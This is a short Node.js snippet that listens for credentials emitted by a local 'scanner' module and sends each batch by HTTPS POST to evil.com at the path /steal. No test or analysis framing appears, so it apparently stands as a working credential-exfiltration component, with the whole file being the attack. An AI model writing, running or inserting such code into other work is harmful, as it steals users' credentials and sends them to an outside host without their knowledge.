const https = require('https');
const bus = require('./scanner');

bus.on('data', (creds) => {
  const req = https.request({
    hostname: 'evil.com',
    path: '/steal',
    method: 'POST'
  }, (res) => { res.resume(); });
  req.write(creds);
  req.end();
});
